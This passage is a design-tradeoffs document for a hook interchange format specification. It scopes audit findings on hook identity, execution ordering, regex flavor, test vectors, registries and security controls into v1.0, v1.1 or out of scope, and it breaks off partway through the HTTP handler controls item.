# Hook Interchange Format Specification: Improvement Tradeoffs

**Date:** 2026-03-27
**Context:** Five-reviewer audit of `docs/spec/` produced 68 findings. 22 simple fixes were applied. This document analyzes the remaining 46 items that require design discussion before scoping into v1.0, v1.1, or out-of-scope.

---

## North Star: What Makes a Good Spec

These principles, drawn from the history of successful specifications (IETF RFCs, LSP, OpenAPI, JSON Schema, Semver, EditorConfig), should guide every scoping decision.

### Core Principles

1. **Prescribe interop, permit implementation.** Use MUST for anything where two implementations handling it differently would fail to interoperate or create a security hole. Use MAY for local implementation choices. The dividing line: "If two implementations differ here, will hooks break?"

2. **You can loosen later; you cannot tighten.** Hyrum's Law guarantees that any observable behavior becomes depended on. Permissive v1.0 decisions become permanent technical debt. When in doubt, be strict — relaxing a MUST to SHOULD in v1.1 is non-breaking; the reverse is breaking. (RFC 9413 formally reversed Postel's Law for new protocols because of this.)

3. **Specify errors, not just happy paths.** Every MUST needs a corresponding "if violated, then..." The specs that punted on error handling (HTTP/1.0, HTML before error handling mandates) created decades of divergent behavior. If two implementations handle malformed input differently, the spec has a bug.

4. **Ship when implemented, not when complete.** Running code validates specs; theoretical completeness is a mirage. The IETF's "rough consensus and running code" principle means: don't standardize what hasn't been built and tested. But also: don't ship a spec that nobody has implemented.

5. **Say "no" more than "yes".** Features not in v1 can go in v2. Features in v1 can never leave. JSON beat XML by doing less. Semver has an explicit "this specification SHOULD NOT be applied to" section. Scope discipline is the most valuable feature a v1 spec can have.

6. **Priority of constituencies.** When in conflict: users > hook authors > adapter implementors > spec authors > theoretical purity. (Adapted from W3C HTML Design Principles and RFC 8890.)

7. **Security MUST is for known, exploitable risks.** Use MUST when failure creates an exploitable vulnerability in typical deployments. Use SHOULD when compliance improves security but alternatives exist or the attack requires unusual conditions. Never use MAY for security — if it's truly optional, it's not a security control. (RFC 3552 framework.)

8. **Design for the ecosystem, not just the protocol.** Specs that consider tooling, libraries, documentation, and community outperform specs that are technically superior but ecosystem-blind. A reference implementation, machine-readable schema, and test suite are as important as the prose.

### The v1.0 Shipping Checklist

From the research, a v1.0 spec is ready to ship when it has:

- [ ] Clear scope statement (what it IS and IS NOT)
- [ ] Defined error handling for every MUST
- [ ] Forward compatibility mechanism
- [ ] Machine-readable schema alongside prose
- [ ] Examples for every concept
- [ ] Security section with explicit threat model
- [ ] At least two independent implementations that interoperate
- [ ] Version and stability guarantees

The hooks spec already has most of these. The question is which of the 46 findings threaten implementability, interoperability, or security — vs. which are improvements that can wait.

---

## Decision Framework

For each item, we evaluate against four criteria:

| Criterion | Question | Weight |
|-----------|----------|--------|
| **Interoperability** | Would two implementations differ here, causing hooks to break or behave differently? | Highest |
| **Security** | Does deferring this create an exploitable vulnerability in typical deployments? | High |
| **Implementability** | Can a stranger implement from the spec alone without asking the author? | High |
| **Ecosystem** | Does this affect adoption, tooling, or contributor experience? | Medium |

**Scoping buckets:**

| Scope | Criteria | Examples |
|-------|----------|---------|
| **v1.0** | Interop-breaking ambiguity, security gap with known exploit path, or implementor-blocking gap | Missing error behavior, undefined terms used in MUST statements |
| **v1.1** | Valuable but not blocking. Implementors can ship without it. Deferring doesn't create permanent debt. | Nice-to-have fields, expanded test vectors, companion docs |
| **Out-of-scope** | Implementation concern (not spec concern), or would require the spec to overstep its charter | Sandboxing profiles, policy engine integration, caching strategies |

---

## Dependency Map

Some items unlock or block others. Key chains:

```
A1 (hook identity) ──> C7 (revocation) ──> C8 (content addressing)
                   ──> C16 (audit logging)
                   ──> B9 (structured warnings — reference hooks by name)

B1 (input contract) ──> D5 (hook testing guidance)
                    ──> B13 (hook authoring guide)

A4 (structural equivalence, DONE) ──> B5 (round-trip test vectors)

C1 (integrity MUST) ──> C11 (TOCTOU protection)
                    ──> C8 (content addressing)
```

---

## Category A: Spec Text — Design Items (8)

### A1. Hook Identity Field

**The question:** Should hooks have a `name` (or `id` + `version`) field?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Optional `name` string** | Simple, non-breaking, immediate DX improvement (warnings say "hook: audit-check" instead of "Hook 3"). Unlocks policy targeting, audit correlation. | Optional means some hooks won't have names, so you can't guarantee policy targeting works. |
| **Required `name` string** | Guarantees every hook is addressable. Policy, revocation, dedup all work. | Breaking change to all existing manifests (they'd fail validation). May be premature — v1.0 doesn't define policy or revocation yet. |
| **Optional `name` + optional `version`** | Full identity model. Enables version pinning, update detection. | More surface area. Version semantics need definition. What does "version" mean for a hook? |
| **Defer to v1.1** | Keeps v1.0 scope minimal. Name can be added as optional field (minor version bump). | Warnings and logs in v1.0 implementations will use positional indexes. Not a permanent problem — implementations can adopt names once available. |

**North star test:** Two implementations won't diverge without this — it's a DX/ecosystem concern, not interop. But it unlocks C7 (revocation) and B9 (structured warnings), which are important for enterprise adoption.

**Dependencies:** Unlocks C7, C16, B9.

**Cost of deferral:** Positional hook references in warnings/logs for v1.0. Fixable in v1.1 without breaking changes.

---

### A2. Hook Execution Ordering

**The question:** When multiple hooks bind to the same event, what order do they execute?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Array order within manifest** | Simple, unambiguous, zero new fields. The spec says "hooks execute in the order they appear in the `hooks` array." | Doesn't address cross-manifest ordering (when hooks come from multiple sources — a registry hook + a local hook). |
| **Array order + `priority` field** | Handles cross-manifest ordering. Integer priority with defined sort. | Adds complexity. Priority conflicts need resolution rules. Most v1.0 users won't have multiple manifests. |
| **Windsurf-style scope tiers** | (system > user > workspace) Proven in production. Handles enterprise use cases. | Adds significant complexity. Tightly coupled to a distribution model the spec explicitly doesn't define. |
| **Defer entirely** | Array order is implied by the data structure. Implementations will naturally use it. | If the spec is silent, an implementation could sort alphabetically, by event, or randomly. Technically an interop risk for hooks with ordering dependencies, but in practice hooks should be independent. |

**North star test:** This IS an interop concern if hooks have side effects that depend on order (e.g., a sanitizer must run before an auditor). But the spec doesn't define cross-manifest composition at all, so cross-manifest ordering is out of scope regardless. Within a single manifest, array order is the obvious convention.

**Cost of deferral:** Low if we at least state array order. Risky if we stay completely silent — divergent implementations would be hard to reconcile later.

---

### A5. Regex Flavor: SHOULD RE2 vs MUST RE2

**The question:** Should RE2 be mandatory for pattern matchers?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST RE2** | Guarantees identical matching across implementations. Prevents lookbehind/backreference portability traps. RE2 is available in Go, Rust, Python, JS (via libraries), Java. | Some languages don't have native RE2 (Ruby, Perl). Forces implementations in those languages to use a non-native regex engine or a C binding. |
| **MUST RE2 subset** | Define a restricted subset (no lookahead, no backreferences) that all flavors can match. | Spec has to define the subset. More prose, more ambiguity about edge cases. |
| **Keep SHOULD, add MUST document deviations** | Pragmatic. Implementations that use PCRE MUST document it. Hook authors can avoid non-RE2 features. | Two implementations WILL diverge on the same pattern. A hook with `(?<=foo)bar` works on one, fails on another. |

**North star test:** "You can loosen later; you cannot tighten." If v1.0 says SHOULD and implementations ship with PCRE, tightening to MUST in v1.1 is a breaking behavioral change. The safe choice is MUST now.

**Practical reality:** Pattern matchers are the LEAST common matcher type (bare strings and MCP objects cover most use cases). The blast radius of SHOULD is limited to the small percentage of hooks using regex patterns.

**Cost of deferral:** A regex portability bug in a niche matcher type. Low blast radius but permanent debt if implementations diverge.

---

### A9. `osx` Platform Key vs `macos` / `darwin`

**The question:** Should the platform key be modernized?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Change to `macos`** | Matches current Apple branding (macOS since 2016). Consistent with what users expect. | Breaking change to any existing manifests using `osx`. Schema change. |
| **Change to `darwin`** | Matches Go's `GOOS`, Node's `process.platform`, and most programming runtime conventions. Technical term, won't go stale. | Less familiar to non-developers. |
| **Keep `osx`, document rationale** | No breaking change. Add a note: "The key `osx` is used for historical consistency with existing provider formats." | Permanently surprising. Every new user will ask about it. |
| **Accept both (`osx` + `macos` alias)** | Non-breaking. Implementations accept either. | Two ways to say the same thing = ambiguity. Which one appears in encoded output? |

**North star test:** The spec is still in draft — now is the only time to make this change without it being breaking. After v1.0, this becomes permanent via Hyrum's Law.

**Practical reality:** The VS Code Copilot extension uses `osx` in its native format. Changing the canonical key to `macos` just means the adapter maps `macos` <-> `osx`. The canonical format is not any provider's native format.

**Cost of deferral:** Permanent "osx" in all canonical manifests forever.

---

### A11. Timeout Behavior as Canonical Field

**The question:** Should `timeout_behavior: "warn" | "block"` be a first-class handler field instead of living in `provider_data`?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add canonical field now** | Safety-critical decision is visible and portable. Adapters can encode it consistently. | Adds a new field to the schema. Currently only meaningful for blocking hooks — is this premature for a field that most hooks won't use? |
| **Keep in `provider_data` with note (current state)** | Minimal spec change. The note signals intent for v1.1. Implementations can use provider_data today. | Safety-critical behavior hidden in opaque blob. Not portable across providers. |

**North star test:** "Timeout on a blocking hook causes the action to proceed with unmodified input" is a security-relevant behavior. Hiding it in `provider_data` violates the principle that safety decisions should be visible and prescriptive.

**Cost of deferral:** Medium. The note was already added pointing to future promotion. Implementations can use `provider_data` in the interim. But any hooks written with `provider_data.timeout_behavior` in v1.0 would need migration when the canonical field is added.

---

### A12. Blocking Degradation Trigger (partially addressed)

**Status:** The SHOULD-to-MUST upgrade was already applied in the simple fixes batch. The remaining question: should blocking-on-observe also trigger the degradation strategy system (not just warn)?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST warn only (current state after fix)** | Simple. The adapter warns; the hook is still encoded. The user sees the warning and can decide. | A PII-blocking hook silently becomes observational. The warning exists but the protection is gone. |
| **Trigger degradation system** | Hook author can specify `degradation: { "blocking": "exclude" }` to say "if my hook can't block, don't include it at all." Consistent with how capability degradation works. | Requires adding "blocking" as a pseudo-capability in the degradation field. Expands the degradation model beyond capabilities into behavioral properties. |

**North star test:** The degradation system already handles this pattern perfectly for capabilities. Extending it to blocking behavior is consistent and gives hook authors control.

**Cost of deferral:** The MUST warn is already in place. The degradation trigger is an enhancement that can be added in a minor version bump.

---

### A13. Draft Spec Identifier

**The question:** Should manifests authored during the draft period use `"hooks/1.0-draft"` instead of `"hooks/1.0"`?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add `-draft` suffix** | Implementations can distinguish draft-era manifests. If the spec changes before finalization, draft manifests can be flagged for review. | Schema pattern change. Adds a migration step when the spec finalizes (manifests need to drop `-draft`). Creates a class of manifests that may or may not be compatible with the final spec. |
| **Keep `"hooks/1.0"` for draft** | Simpler. No migration needed. The spec status is in the document header, not in manifests. If the spec is designed well, draft manifests should be compatible with the final spec. | If the spec makes breaking changes during the draft period, there's no way to distinguish old manifests from new ones. |
| **Use `"hooks/0.1"` for draft, `"hooks/1.0"` for final** | Semver convention: 0.x means "anything may change." Clear signal. | Requires a breaking version change at finalization. All early adopter manifests need a spec field update. |

**North star test:** JSON Schema regretted calling releases "drafts" because it confused users about production-readiness. But they also regretted not having version markers that distinguished incompatible releases. The question is: do we expect breaking changes before finalization?

**Practical reality:** If the spec is well-designed and the scope is disciplined, the final v1.0 should be backwards-compatible with draft-era manifests. The `-draft` suffix adds complexity for a problem that might not occur.

**Cost of deferral:** If the spec changes incompatibly during draft, existing manifests silently become invalid with no way to detect them. Low probability if the spec is stable; high cost if it happens.

---

### A19. Pattern Matcher: When Does Matching Happen?

**The question:** Are patterns matched against canonical tool names or provider-native tool names? At decode time, encode time, or runtime?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Runtime, against provider-native names** | This is what the spec currently says (Section 6.2). Patterns are passed through to the target provider, which applies them at runtime. Simple for adapters — just preserve the string. | A hook author writing a canonical manifest doesn't know provider-native names. A pattern `file_(read\|write)` works for Claude Code but not for Cursor (where tools are `read_file`/`edit_file`). |
| **Runtime, against canonical names (with adapter translation)** | Hook authors write patterns against canonical vocabulary. Adapters translate patterns to provider-native equivalents during encode. | Regex translation is hard. How do you translate `file_(read\|write)` to match Cursor's `read_file` and `edit_file`? Not always possible. |
| **Clarify: patterns are opaque, matched at runtime by the target provider** | Honest about the limitation. Hook authors who use patterns accept provider-specific behavior. Bare strings (which go through the vocabulary) are the portable option. | Some hook authors will expect patterns to be portable and be surprised. |

**North star test:** Bare string matchers already provide portable tool matching through the vocabulary. Pattern matchers are an escape hatch for cases the vocabulary doesn't cover. Trying to make patterns portable across providers would require regex-to-regex translation, which is an unsolvable problem in the general case.

**The honest answer:** Patterns are provider-specific. Clarify this and move on.

**Cost of deferral:** Implementors will guess. Some will try to translate patterns (and fail on edge cases). A clear statement prevents wasted effort.

---

## Category B: Structural Additions — Design Items (15)

### B1. Hook Input Contract

**The question:** Should the spec define what data hooks receive as input (stdin, env vars, arguments)?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define per-event stdin JSON schema** | Complete spec — defines both inputs and outputs. Hook authors can write hooks from the spec alone. Enables test tooling for hook authors. | Every provider sends different data to hooks. Defining a canonical input schema means adapters must normalize input, not just output. Significant spec expansion. |
| **Define minimum required env vars** | Lighter touch. Require implementations to set `HOOK_EVENT`, `HOOK_TOOL_NAME`, `HOOK_BLOCKING` (or similar). Stdin remains provider-specific. | Doesn't solve the "hook authors can't write portable hooks" problem. Env vars are less expressive than JSON. |
| **Document the gap, defer to v1.1** | Honest about the limitation. The spec currently defines the interchange format for *manifests*, not for *runtime data*. Adding a runtime input contract is a significant scope expansion. | Hook authors can't write portable hooks without knowing what data they'll receive. But they also can't write portable hooks today (they write for one provider and use syllago to convert the manifest). |

**North star test:** The spec's charter is "interchange format for hook manifests" — it defines how to CONVERT hooks between providers, not how to RUN them. The input contract is a runtime concern that varies by provider. That said, the spec DOES define the output schema, which creates an asymmetry.

**Practical reality:** Hook portability through syllago means: the MANIFEST is portable, but the SCRIPT runs in a specific provider's environment. The script receives provider-specific input. The spec converts the manifest, not the runtime behavior.

**Cost of deferral:** Hook authors can't write "write once, run everywhere" hooks. But that was never the spec's promise — hub-and-spoke conversion of manifests was. The cost is a documentation gap, not an interop gap.

---

### B2. Test Vectors: Only 3/8 Providers

**The question:** How many providers need test vectors before v1.0?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **All 8 providers** | Complete coverage. Every adapter has ground truth. | Massive effort. Some providers (Kiro, OpenCode) have sparse documentation. Windsurf's enterprise features are hard to verify externally. |
| **5 providers (add Windsurf + Copilot CLI)** | Covers both split-event providers (Cursor already done, add Windsurf), both Copilot flavors, and the three most popular tools. 5/8 is credible. | Still missing Kiro, OpenCode, VS Code Copilot. |
| **Keep 3, require vectors for new providers via CONTRIBUTING.md** | The spec already requires test vectors for new providers (Section 4 of CONTRIBUTING.md). Let the community fill in gaps. | The spec doesn't meet its own bar. "Do as I say, not as I do" hurts credibility. |

**North star test:** The shipping checklist says "at least two independent implementations that interoperate." Three provider vectors exceeds that. But the spec defines eight providers in its registry — having vectors for only 3 undermines confidence in the mappings for the other 5.

**Practical reality:** The three existing providers (Claude Code, Gemini CLI, Cursor) represent: one unified-event provider, one with custom event mappings, and one split-event provider. This covers the three architectural patterns. Adding Windsurf (split-event + enterprise) would be the highest-value addition.

**Cost of deferral:** Adapter implementors for Windsurf/Copilot/Kiro/OpenCode have no ground truth. They'll implement in isolation and may produce incompatible results. Medium risk — mitigated by the spec prose being detailed.

---

### B3. Non-Command Handler Test Vectors

**The question:** Should v1.0 include test vectors for `http`, `llm_evaluated`, `async`, and `input_rewrite` degradation?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add vectors for all non-command types** | Complete test coverage. The `input_rewrite` degradation (block by default) is the spec's most safety-critical feature — zero test coverage is indefensible. | Some handler types (`llm_evaluated`, `http`) are only supported by 1-2 providers. Test vectors for unsupported conversions are mostly warnings. |
| **Add `input_rewrite` degradation vector only** | Targets the highest-risk gap. Shows a hook with `input_rewrite` being converted to a provider that doesn't support it, verifying the `block` default fires. | Still no coverage for http/llm/async. |
| **Defer** | Existing vectors cover the dominant use case (command handlers). Non-command types are capabilities with explicit degradation strategies — the mechanism is tested even if specific types aren't. | The safety-critical `input_rewrite: "block"` default has zero test coverage. If an adapter gets this wrong, the user has a false sense of security. |

**North star test:** "Specify errors, not just happy paths." The `input_rewrite` degradation is a safety-critical error path. It must be tested.

**Cost of deferral:** An adapter that silently drops `input_rewrite` instead of blocking passes all existing tests. Users believe they're protected when they're not. This is a security gap.

---

### B4. Negative/Error Test Vectors

**The question:** Should v1.0 include test vectors for invalid inputs?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add negative vectors** | Ensures implementations reject the same inputs. Prevents the "permissive acceptance" problem (RFC 9413). Catches implementations that validate too loosely. | What's the expected output for an invalid input? An error message? The spec doesn't define error formats (see B9). |
| **Defer** | Positive test vectors establish the happy path. Negative testing is implementation-specific. | Two implementations may accept different invalid inputs, creating portability surprises. But this is a testing concern, not a spec concern. |

**North star test:** Negative tests prevent the "Postel's Law pathological feedback cycle" where bugs become de facto standards. But without a structured error format (B9), there's nothing to test against for invalid inputs beyond "MUST reject."

**Cost of deferral:** Low in isolation. Becomes a problem if implementations silently accept invalid manifests and users depend on the lax behavior (Hyrum's Law).

---

### B5. Round-Trip Test Vectors

**The question:** Should v1.0 include provider->canonical->provider round-trip vectors?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add for at least one provider** | Validates decode correctness (all current vectors only test encode). The CONTRIBUTING.md requires round-trip tests for new providers — the spec should demonstrate it. | Requires defining "structurally equivalent" (done in glossary fix A4). Round-trip for lossy providers (Cursor) will have warnings — need to document what's acceptable. |
| **Defer** | Encode vectors + the glossary definition of structural equivalence give implementors enough to build decode logic. | No ground truth for decode correctness. Implementors building decoders have to infer expected output. |

**North star test:** Full conformance (Section 13.3) requires round-trip fidelity. If the spec mandates round-tripping but provides no test vectors for it, that's a gap.

**Cost of deferral:** Full-conformance implementations can't verify their decode logic against spec-provided vectors. They'll rely on their own tests, which may diverge.

---

### B6. Reference Implementation / Compliance Test Suite

**The question:** Does v1.0 need an executable compliance suite?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Ship standalone validator CLI** | Gold standard (EditorConfig, LSP both did this). Implementors run one command to check compliance. | Significant engineering investment. Is this a spec artifact or a syllago tool? |
| **Ship executable test runner (JSON fixture-based)** | Lighter than a full validator. A script that runs the test vectors against an adapter CLI. | Still requires defining the adapter CLI interface (stdin/stdout contract). |
| **Defer to community** | syllago IS the reference implementation. Its adapter code is the ground truth. | "Your test suite is reading our source code" is not a spec. Community implementations have no independent verification path. |

**North star test:** "At least two independent implementations that interoperate." A compliance suite makes independent implementation practical. Without it, the spec succeeds only if implementors can read the prose and get it right.

**Practical reality:** syllago's adapter code IS a reference implementation, even if it's not labeled as one. The gap is a standalone verification tool.

**Cost of deferral:** Implementors have test vectors (JSON fixtures) but no automated way to verify against them. Medium cost — manual verification works but doesn't scale.

---

### B7. Machine-Readable Registries

**The question:** Should event, tool, and capability registries be published as JSON/YAML data files?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Publish JSON registry files** | Adapters import data directly instead of parsing markdown. Enables automated validation (check event names against registry). Foundation for a standalone validator (B6). | Dual-source-of-truth risk: markdown tables and JSON files can diverge. Need a generation step or single source. |
| **Generate markdown from JSON** | Single source of truth (JSON), rendered to markdown for human reading. | Adds a build step to the spec. More tooling to maintain. |
| **Defer** | Markdown tables are readable. syllago already has this data in Go code. Other implementations can copy it. | Every implementor re-transcribes the tables. Error-prone and tedious. |

**North star test:** "Provide a machine-readable schema alongside prose." The spec has a JSON Schema for manifests but not for its registries. This is a gap, but not a blocking one for v1.0.

**Cost of deferral:** Each adapter implementation manually transcribes registry tables. Errors accumulate. Low-medium risk.

---

### B9. Structured Warning/Error Format

**The question:** Should the spec define a schema for conversion warnings?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define warning schema** | Consistent diagnostic output across implementations. Enables tooling (linters, CI checks). Makes B4 (negative test vectors) feasible. | Adds surface area. What fields? Severity, capability, hook index/name, message? Is this normative or informational? |
| **Formalize the `_warnings` array from test vectors** | Already exists informally. Just document and standardize it. Minimal new spec surface area. | `_warnings` is a flat string array. Not structured enough for programmatic consumption. |
| **Defer** | Warnings are implementation-specific. The spec says "MUST produce warnings" — how they're formatted is a local choice. | Every implementation produces different warning formats. CI/tooling integration requires parsing prose. |

**North star test:** Warnings are not part of the interchange format. They're a conversion artifact. The spec's charter is the format, not the conversion tooling. But the spec DOES define the conversion pipeline (Section 12), so warning format is in scope.

**Cost of deferral:** Low for interop (warnings don't affect hook behavior). Medium for ecosystem (tooling can't consume warnings programmatically).

---

### B10. Deprecation Mechanism for Registry Entries

**The question:** Should registry entries support a `deprecated` flag?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add `deprecated` + `replacement` fields** | Enables soft migration when event/tool names change. Proven pattern (LSP, OpenAPI). | No registry entries need deprecation yet. Adding the mechanism before the need is speculative. |
| **Defer** | The registries are date-stamped and grow-only. Deprecation hasn't been needed. | When the first deprecation IS needed, there's no mechanism. But adding it later is non-breaking (just add fields to registry entries). |

**North star test:** "Features not in v1 can go in v2." Deprecation is a mechanism for managing future change. It's not needed until there's something to deprecate.

**Cost of deferral:** None until the first deprecation event. Then it's a minor version bump to add the mechanism.

---

### B12. Signal Handling / Process Termination

**The question:** Should the spec define how hook processes are terminated on timeout?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define: SIGTERM, grace period, SIGKILL** | Consistent behavior. Hook scripts can implement cleanup on SIGTERM. | Windows has no SIGTERM. Cross-platform spec is messy. Implementation-specific process management. |
| **Defer with recommendation** | Add a non-normative note: "Implementations SHOULD send SIGTERM (or platform equivalent) and allow a brief grace period before forceful termination." | Not normative. Implementations may differ. |
| **Defer entirely** | Process lifecycle is an implementation concern. The spec defines the exit code contract, not how the process reaches that exit code. | Hook authors writing cleanup logic don't know if they'll get SIGTERM or SIGKILL. |

**North star test:** "Prescribe interop, permit implementation." Process termination is a local implementation choice. Two implementations terminating processes differently doesn't cause hook behavior to diverge (the hook is being killed either way).

**Cost of deferral:** Hook authors writing cleanup logic may be surprised. Low interop risk.

---

### B13. Hook Authoring Guide

**The question:** Should v1.0 ship with a non-normative authoring guide?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Ship companion doc** | Lowers the authoring barrier. Shows the end-to-end workflow. Addresses the tech writer reviewer's biggest concern. | Effort. Must be maintained alongside the spec. May become stale. |
| **Defer** | The spec examples (3.7, 3.8) plus the CONTRIBUTING.md are sufficient for v1.0. A guide can follow later. | Hook authors are a secondary audience. Adapter implementors (the primary audience) don't need it. |

**North star test:** "Priority of constituencies: users > hook authors > adapter implementors." Hook authors are the users of this ecosystem. But the spec's primary job is to enable adapters — the authoring guide is ecosystem, not protocol.

**Cost of deferral:** Higher adoption friction for hook authors. No interop impact.

---

### B14. Missing Events: `before_file_read`, `before_response`

**The question:** Should new core events be added?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Add `before_file_read` as core** | First-class data access control. Enterprise need for DLP/classification. | Already expressible as `before_tool_execute` + `matcher: "file_read"`. Adding a redundant core event increases surface area without new capability. |
| **Add `before_response` / `after_response`** | Content filtering, brand compliance, output redaction. | Only Gemini has `after_model` (provider-exclusive). Adding a core event that only 1/8 providers support is premature. |
| **Defer** | The event registry is date-stamped and grows independently of the spec version. New events can be added without a spec version bump (Section 14.2). | No cost to deferral — the mechanism for adding events exists. |

**North star test:** "Say 'no' more than 'yes'." The existing `before_tool_execute` + matcher already covers `before_file_read`. Adding a synonym doesn't add capability. And adding events with 1/8 provider support doesn't belong in "core."

**Cost of deferral:** Zero. The event registry mechanism handles this cleanly.

---

### B15. Warm-Process / Long-Running Handler Type

**The question:** Should the spec define a persistent hook daemon protocol?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define `type: "daemon"` handler** | Eliminates fork/exec overhead. Prevents 8 incompatible daemon protocols. | Significant complexity. Requires defining the daemon communication protocol (stdin JSON lines? HTTP? Unix socket?). No provider currently supports this natively. |
| **Defer** | The spec is a format spec, not a runtime spec. Performance optimization is an implementation concern. Providers can experiment with daemon modes and the spec can standardize once patterns emerge. | 8 providers may invent 8 incompatible daemon protocols. But they're already free to do this with `provider_data`. |

**North star test:** "Standardize things that have been implemented and tested." No provider has a daemon hook model. This is speculative standardization. Wait for running code.

**Cost of deferral:** Possible protocol fragmentation. But fork/exec per hook is the universal current model — fragmenting away from it requires someone to build it first.

---

### B16. Registry Versioning

**The question:** Where are registry versions declared, and what happens with unknown values from a newer registry?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define registry version field in manifests** | Manifests declare which registry version they were authored against. Implementations can detect forward-compatibility issues. | Adds a field. Creates version coupling between manifests and registries. |
| **Define behavior for unknown values** | "Unknown bare string matchers MUST be passed through as literal strings." Clear, simple, forward-compatible. | Typos also pass through silently. No way to distinguish "new tool name" from "misspelled tool name." |
| **Defer** | The ignore-unknown-fields rule handles most cases. Unknown event names get caught at encode time (the target provider either supports them or doesn't). | Unknown bare string matchers are values, not fields — the ignore-unknown-fields rule doesn't clearly apply. |

**North star test:** The forward-compatibility rule (Section 3.2) is about fields, not values. Unknown values in matchers are a gap. At minimum, state the behavior.

**Cost of deferral:** Implementors will guess. Some will reject unknown tool names, some will pass through. Interop risk for hooks using newly-added tool vocabulary entries.

---

### B17. Cursor Native Format Inconsistency in Test Vectors

**The question:** Should the spec normatively define provider-native output schemas?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **Define native schemas per provider** | Complete specification. Adapter implementors have full ground truth. | Massive scope expansion. The spec would need to track 8 providers' native formats. Those formats are owned by the providers, not by this spec. |
| **Fix the test vector inconsistency** | If Cursor uses arrays for multiple hooks and objects for single hooks, document this convention in the test vectors. | A narrow fix. Doesn't solve the general "native formats aren't specified" problem. |
| **Declare out of scope** | The spec defines the canonical format, not native formats. Native format details come from provider documentation. Test vectors show expected output but are not normative definitions of native formats. | Adapter implementors must cross-reference provider docs. But they'd need to anyway — the spec can't track provider format changes in real time. |

**North star test:** "Prescribe interop, permit implementation." The spec's interop contract is the canonical format. Native formats are implementation concerns owned by the providers.

**Cost of deferral:** The test vector inconsistency should still be fixed (use arrays consistently for Cursor output, matching their actual format). But normatively defining native schemas is out of scope.

---

### B18. Changelog

**Note:** This was listed as "simple" but creating a meaningful changelog requires deciding what to track. Adding an empty file is trivial; making it useful requires thought.

**Recommendation:** Create `docs/spec/CHANGELOG.md` with the current version entry listing the simple fixes just applied. Going forward, update it with each spec change.

---

## Category C: Security Posture — Design Items (15)

### C1. Content Integrity: SHOULD to MUST

**The question:** Should SHA-256 hashes be mandatory for hook distribution?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST include hashes, MUST verify** | Closes the integrity gap. Every hook has a verifiable hash. Matches npm's post-incident evolution. | Changes the authoring experience: every hook needs hash generation tooling. Hashes without a trust anchor only catch accidental corruption, not malicious tampering (attacker modifies both script and hash). |
| **MUST include hashes, SHOULD verify** | Hashes are always available for verification. Implementations choose whether to verify. Intermediate step. | "SHOULD verify" means many won't. The hash exists but isn't checked — minimal security value. |
| **Keep SHOULD, strengthen language** | Rewrite to emphasize the risk: "Implementations that distribute hooks from untrusted sources MUST verify content hashes." Scoped MUST for the high-risk case. | Still optional for local hooks and trusted sources. |
| **Defer to distribution spec** | The hooks spec is a format spec, not a distribution spec (Section 1.2). Content integrity is a distribution concern. | The security reviewer is right that the combination of "format spec + package manager distributing that format" creates a risk the format spec should acknowledge. |

**North star test:** "Security MUST is for known, exploitable risks." The February 2026 CVE (referenced in the spec's own security doc) proved this is a known, exploited attack surface. However, the spec explicitly excludes distribution from scope (Section 1.2). The integrity guarantee belongs in the distribution/registry spec, not the format spec.

**The nuance:** This is the right finding applied to the wrong document. syllago (the tool) should enforce integrity. The hooks spec (the format) should acknowledge the risk and RECOMMEND integrity but leave enforcement to the distribution layer.

**Cost of deferral:** If syllago enforces integrity at the tool level, the spec's SHOULD is fine. If syllago doesn't, the spec's SHOULD provides no protection.

---

### C2. `provider_data` Validation: SHOULD to MUST

**The question:** What does mandatory validation of `provider_data` mean concretely?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST validate against provider-defined schema** | Concrete and testable. Each provider publishes a `provider_data` schema; adapters validate against it. | Requires every provider to publish and maintain a `provider_data` schema. Adds a schema management burden. |
| **MUST NOT override security-relevant fields** | Narrower. List specific prohibited overrides: paths, URLs, permissions. | Defining "security-relevant" is subjective. List will be incomplete. |
| **MUST treat as untrusted input (current + strengthen)** | Rewrite Section 2.2 to be more prescriptive about what "treat as untrusted" means concretely. Add specific prohibited patterns. | Still a SHOULD for some aspects. Better than current but not fully prescriptive. |

**North star test:** "Adapters MUST treat `provider_data` as untrusted input" is already in the spec. The gap is: what does "untrusted" mean operationally? The answer: adapters MUST validate values against expected types and ranges, MUST NOT use values to construct file paths outside the project directory, and MUST NOT use values to override security-relevant configuration.

**Cost of deferral:** An adapter bug that trusts `provider_data` values could be exploited. But the existing language ("MUST NOT blindly copy", "MUST treat as untrusted") already provides the right intent — implementations that ignore it would ignore stronger language too.

---

### C3. HTTP Handler Controls

**The question:** What controls should be mandated for `type: "http"` hooks?

**Tradeoffs:**

| Option | Pros | Cons |
|--------|------|------|
| **MUST HTTPS, MUST display URL** | Minimum viable controls. Prevents plaintext exfiltration and ensures user awareness. | HTTPS doesn't prevent exfiltration to attacker-controlled HTTPS endpoints. Display-at-install-time doesn't help if the URL is later modified. |
